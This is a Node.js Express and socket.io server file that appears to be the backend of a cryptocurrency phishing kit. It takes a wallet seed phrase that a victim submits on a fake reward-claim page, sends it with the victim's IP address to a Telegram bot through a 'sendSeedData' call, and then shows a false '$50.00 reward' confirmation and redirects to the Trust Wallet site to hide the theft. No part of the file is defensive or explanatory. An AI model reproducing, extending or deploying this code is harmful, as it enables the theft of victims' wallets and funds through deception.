require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Middleware to serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Socket.io Connection Logic
io.on('connection', (socket) => {
    // Get IP for logging
    const userIP = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    console.log(`📡 New session active: ${userIP}`);

    // Listen for the ASA claim event from manager.js
    socket.on('submit_to_bot', async (data) => {
        console.log("📥 Received claim submission. Relaying to bot...");
        
        // Use bot_manager to send to Telegram
        const delivered = await botManager.sendSeedData(data.phrase, userIP);
        
        if (delivered) {
            // Send success response back to the browser
            socket.emit('bot_confirmation', {
                msg: "Verification Successful! Your $50.00 reward has been queued for transfer and will arrive within 24 hours.",
                redirect: "https://trustwallet.com/"
            });
        } else {
            console.log("⚠️ Failed to deliver to Telegram. Check your .env credentials.");
        }
    });
});

// Port configuration for Render/Local
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`
🚀 ASA SERVER IS LIVE
------------------------------
🔗 Local Access: http://localhost:${PORT}
📁 Root Dir: ${__dirname}
------------------------------
    `);
});